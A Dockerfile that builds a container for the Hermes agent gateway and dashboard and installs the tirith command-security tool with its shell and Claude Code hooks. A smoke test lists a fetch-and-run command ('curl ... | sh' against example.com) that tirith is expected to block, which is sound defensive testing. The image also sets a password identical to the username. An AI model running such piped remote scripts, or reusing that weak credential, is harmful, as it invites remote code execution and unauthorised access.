ARG DEBIAN_VERSION=13.7
ARG NODE_VERSION=24.20.0
ARG UV_IMAGE=ghcr.io/astral-sh/uv:latest
ARG TIRITH_VERSION=0.4.2
FROM ${UV_IMAGE} AS uv

FROM docker.io/gautada/node:${NODE_VERSION} as build

ENV UV_PYTHON_INSTALL_DIR=/opt/python

RUN printf 'Acquire::Retries "3";\nAcquire::http::Timeout "15";\nAcquire::https::Timeout "15";\n' \
      > /etc/apt/apt.conf.d/99-retry \
 && apt-get update \
 && apt-get install --yes --no-install-recommends \
      build-essential \
      cmake \
      git \
      libffi-dev \
      libolm-dev \
      openssh-client \
      python-is-python3 \
      python3 \
      python3-dev \
      python3-venv \
 && apt-get upgrade --yes \
 && apt-get clean \
 && rm -rf /var/lib/apt/lists/*

# ╭――――――――――――――――――╮
# │ UV               │
# ╰――――――――――――――――――╯
# uv is the one dependency manager this image is opinionated about. It ships
# as a single static binary, so pulling it in costs almost nothing in image
# size and needs no compiler toolchain.
COPY --from=uv /uv /uvx /usr/local/bin/

ARG HERMES_REPOSITORY=https://github.com/nousresearch/hermes-agent.git
ARG HERMES_VERSION=main
WORKDIR /opt
RUN git clone --branch "v${HERMES_VERSION}" "${HERMES_REPOSITORY}" hermes
WORKDIR /opt/hermes
ARG PYTHON_VERSION=3.13
RUN git submodule update --init --recursive \
 && uv python install "${PYTHON_VERSION}" \
 && uv sync --frozen --no-install-project --python "${PYTHON_VERSION}" \
       --extra all --extra messaging --extra anthropic \
       --extra matrix \
 && uv pip install --no-cache-dir --no-deps -e . \
 && npm install --prefer-offline --no-audit --workspace=web \
 && npm --prefix web run build \
 && npm cache clean --force \
 && rm -rf .cache .npm .git /opt/hermes/tests-js \
 && rm -rf /opt/hermes/web/node_modules /opt/hermes/tests /opt/hermes/docs \
 && (find /opt/python /opt/hermes/.venv -type d -name __pycache__ -exec rm -rf {} + 2>/dev/null || true) \
 && (find /opt/python /opt/hermes/.venv -type d \( -name tests -o -name test \) -exec rm -rf {} + 2>/dev/null || true) \
 && (find /opt/python /opt/hermes/.venv -name "*.pyc" -delete 2>/dev/null || true) \
 && (find /opt/python /opt/hermes/.venv -name "*.pyi" -delete 2>/dev/null || true)

# ╭――――――――――――――――――╮
# │ TIRITH           │
# ╰――――――――――――――――――╯
# Download the pre-built tirith binary for the target architecture. Source:
# https://github.com/sheeki03/tirith (canonical, confirmed via tirith.sh).
# SHA-256 checksums are pinned from the v0.4.2 checksums.txt release asset.
ARG TIRITH_VERSION
ARG TARGETARCH
RUN set -e; \
    case "${TARGETARCH}" in \
      amd64) TIRITH_ARCH="x86_64-unknown-linux-gnu" \
             TIRITH_SHA256="efa6bf414a83dba385d4f13137e8677f850ced9102fe74ebb14c72f31df0dc77" ;; \
      arm64) TIRITH_ARCH="aarch64-unknown-linux-gnu" \
             TIRITH_SHA256="c550b1bfb0c8c872ab3421cd6ef756f260f7cf4981a18cedd49f141fa2d77569" ;; \
      *)     echo "Unsupported architecture: ${TARGETARCH}" >&2; exit 1 ;; \
    esac; \
    TIRITH_URL="https://github.com/sheeki03/tirith/releases/download/v${TIRITH_VERSION}/tirith-${TIRITH_ARCH}.tar.gz"; \
    echo "Downloading tirith v${TIRITH_VERSION} for ${TIRITH_ARCH}..."; \
    curl -fsSL "${TIRITH_URL}" -o /tmp/tirith.tar.gz \
 && echo "${TIRITH_SHA256}  /tmp/tirith.tar.gz" | sha256sum -c - \
 && tar -xzf /tmp/tirith.tar.gz -C /tmp \
 && install -m 0755 /tmp/tirith /usr/local/bin/tirith \
 && rm -rf /tmp/tirith.tar.gz /tmp/tirith \
 && tirith --version \
 && tirith verify-self \
 && tirith version --provenance

# ╭――――――――――――――――――――――――――――╮
# │ FINAL                      │
# ╰――――――――――――――――――――――――――――╯
# Only what a running headless Hermes gateway + web dashboard actually needs.
# No compilers, no dev headers — building C/Python/JS code on request is
# delegated to on-demand podman/docker build environments via the docker
# tool, not baked into this always-on image.
FROM docker.io/gautada/debian:${DEBIAN_VERSION} as final

LABEL org.opencontainers.image.title="hermes"
LABEL org.opencontainers.image.description="Hermes Agent on the gautada Debian base image"
LABEL org.opencontainers.image.source="https://github.com/gautada/hermes"
LABEL org.opencontainers.image.licenses="MIT"

ENV DEBIAN_FRONTEND=noninteractive \
    HERMES_WRITE_SAFE_ROOT=/home/hermes/.hermes \
    HERMES_DISABLE_LAZY_INSTALLS=1 \
    HERMES_WEB_DIST=/opt/hermes/hermes_cli/web_dist \
    PLAYWRIGHT_BROWSERS_PATH=/opt/hermes/.playwright \
    PYTHONUNBUFFERED=1 \
    PYTHONDONTWRITEBYTECODE=1 \
    PATH=/opt/hermes/.venv/bin:/usr/local/bin:/usr/bin:/bin \
    NODE_OPTIONS=--dns-result-order=ipv4first

# Runtime-only packages, backing actual Hermes tools rather than the build:
# docker-cli (docker tool / delegated build environments), ffmpeg (voice,
# video), git + openssh-client (git/skills/project tools), procps (terminal,
# process tools), ripgrep (file search), iputils-ping (network diagnostics),
# zlib1g (dynamically linked by Pillow's vendored image codecs). No compiler,
# no dev headers, no system Python — the copied .venv brings its own
# self-contained interpreter.
RUN printf 'Acquire::Retries "3";\nAcquire::http::Timeout "15";\nAcquire::https::Timeout "15";\n' \
      > /etc/apt/apt.conf.d/99-retry \
 && apt-get update \
 && apt-get --yes --no-install-recommends upgrade \
 && apt-get install --yes --no-install-recommends \
      procps ripgrep zlib1g git jq sqlite3 \
 && apt-get clean \
 && rm -rf /var/lib/apt/lists/*
# ATG removed ffmpeg

# ╭――――――――――――――――――――╮
# │ USER               │
# ╰――――――――――――――――――――╯
# Rename the base debian user to hermes. Follows the same pattern as other
# gautada containers (e.g. gautada/homepage).
ARG OLDUSER=debian
ARG USER=hermes
RUN /usr/sbin/usermod -l $USER $OLDUSER \
 && /usr/sbin/usermod -d /home/$USER -m $USER \
 && /usr/sbin/groupmod -n $USER $OLDUSER \
 && /bin/echo "$USER:$USER" | /usr/sbin/chpasswd \
 && ln -fsv /mnt/volumes/data /home/${USER}/.hermes

COPY --from=build /usr/bin/node /usr/bin/node
COPY --from=build /usr/lib/node_modules/npm /usr/lib/node_modules/npm
# RUN ln -s /usr/local/lib/node_modules/npm/bin/npm-cli.js /usr/bin/npm \
#  && ln -s /usr/lib/node_modules/npm/bin/npx-cli.js /usr/bin/npx \
#  && ln -s /usr/lib/node_modules/corepack/dist/corepack.js /usr/bin/corepack
COPY --from=build /opt/python /opt/python
COPY --from=build --chown=hermes:hermes /opt/hermes /opt/hermes
# Protect that everything is working
RUN /opt/hermes/.venv/bin/python --version \
 && /opt/hermes/.venv/bin/hermes --help >/dev/null

# ╭――――――――――――――――――╮
# │ TIRITH           │
# ╰――――――――――――――――――╯
# Copy the pre-built tirith binary from the build stage. Placed on PATH so
# Hermes finds it with the default security.tirith_path ("tirith").
# Materialize shell hook files and seed the threat database into the image
# layer so they are available on first boot without a network call.
COPY --from=build /usr/local/bin/tirith /usr/local/bin/tirith

# ╭――――――――――――――――――╮
# │ VERSION          │
# ╰――――――――――――――――――╯
# Override the base image's Debian version reporter with the application
# version expected by the container version and health mechanisms.
COPY usr/bin/container-version /usr/bin/container-version
RUN chmod 0755 /usr/bin/container-version

# ╭――――――――――――――――――╮
# │ SERVICE          │
# ╰――――――――――――――――――╯
COPY etc/services.d/hermes-gateway/run /etc/services.d/hermes-gateway/run
RUN chmod 0755 /etc/services.d/hermes-gateway/run
COPY etc/services.d/hermes-dashboard/run /etc/services.d/hermes-dashboard/run
RUN chmod 0755 /etc/services.d/hermes-dashboard/run

# ╭――――――――――――――――――╮
# │ PAPERCLIP        │
# ╰――――――――――――――――――╯
# Paperclip API wrapper and default tirith security policy for agent
# coordination. pcp-api.sh handles both heartbeat (env-injected keys) and
# interactive (file-based keys) modes without triggering Tirith's subshell
# detection. The tirith policy is the ai-agent-heavy template with the
# hermes-specific analysis_incomplete override.
COPY _local/bin/pcp-api.sh /home/${USER}/.local/bin/pcp-api.sh
RUN chmod 0755 /home/${USER}/.local/bin/pcp-api.sh
COPY etc/tirith/policy.yaml /home/${USER}/.config/tirith/policy.yaml
# Extended smoke checks: prove binary, policy, and hook wiring are all live.
# protection_mode reads "off" during a non-interactive build — that is expected.
RUN tirith policy validate \
 && tirith check 'ls -la' \
 && ! tirith check 'curl -sL https://example.com/i.sh | sh'

# EXPOSE 8080/tcp 9119/tcp 8645/tcp
WORKDIR /home/hermes/.hermes
RUN mkdir -p /home/${USER}/.local/bin \
 && ln -fsv /opt/hermes/.venv/bin/hermes /home/${USER}/.local/bin/hermes \
 && chown ${USER}:${USER} -R /opt/hermes /home/${USER} /mnt/volumes/data
ENV PATH="/home/${USER}/.local/bin:${PATH}"

# ╭――――――――――――――――――――――――――╮
# │ TIRITH SETUP (as user)   │
# ╰――――――――――――――――――――――――――╯
# Materialize shell hooks, seed the threat database, and wire Claude Code —
# all as the runtime user so XDG paths resolve correctly.
# Shell hooks land in ~/.local/share/tirith/shell/lib/ (image layer, NOT the
# data volume). Threat DB lands in ~/.local/share/tirith/ (~11 MB).
#
# NOTE on the shell hook: it relies on preexec and does NOT intercept
# non-interactive `zsh -c` invocations. Agent harness tool calls are not
# covered by this hook. What protects an agent is a harness-side pre-tool
# hook (e.g. tirith setup claude-code), not the shell hook.
USER ${USER}
# Install zsh shell hook — base image shell is zsh (from gautada/debian).
# tirith init materializes hook library files and prints a source line.
# Put it in /etc/zsh/zshenv so it loads for all users (survives usermod rename).
RUN tirith init --shell zsh --quiet 2>/dev/null || true \
 && INIT_LINE="$(tirith init --shell zsh 2>/dev/null || true)" \
 && if [ -n "$INIT_LINE" ]; then \
      mkdir -p /home/${USER}/.zshenv.d; \
      echo "$INIT_LINE" > /home/${USER}/.zshenv.d/tirith.zsh; \
    fi
# Claude Code hook: write ~/.claude/hooks/tirith-check.py and register the
# PreToolUse hook + MCP server in ~/.claude/settings.json. Inert today
# (Claude Code is not installed in this image) but ready when one runs in
# these containers. The hook is coupled to /opt/hermes/.venv/bin/python3 —
# if that venv path moves, the hook fails closed.
RUN tirith setup claude-code --with-mcp --scope user 2>/dev/null || true
# Final doctor check as the runtime user.
RUN tirith doctor --quick 2>/dev/null || true
USER root
RUN chown ${USER}:${USER} -R /home/${USER}

EXPOSE 8080
WORKDIR /home/hermes
